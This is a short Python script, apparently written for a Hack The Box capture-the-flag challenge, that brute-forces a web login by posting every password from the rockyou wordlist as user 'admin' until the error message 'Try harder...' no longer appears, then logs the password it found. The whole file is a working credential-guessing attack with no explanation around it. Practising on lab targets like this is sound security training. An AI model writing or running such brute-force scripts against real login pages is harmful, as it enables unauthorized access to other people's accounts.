#!/usr/bin/python3
import requests

server = "http://docker.hackthebox.eu:53460/main/index.php"
error_string = "Try harder..."

logfile = open("logfile.txt","w")
user = "admin"

with open("../common-resources/rockyou.txt","r") as f:
    for line in f:
        passwd = line.rstrip()
        payload = {'name1':user, 'name2': passwd}
        r = requests.post(server, data=payload)

        logfile.write(str(r.status_code))

        if(error_string not in r.text):
            logfile.write(r.text)
            logfile.write("------ Password found -------: " + passwd)
            break;

logfile.close()
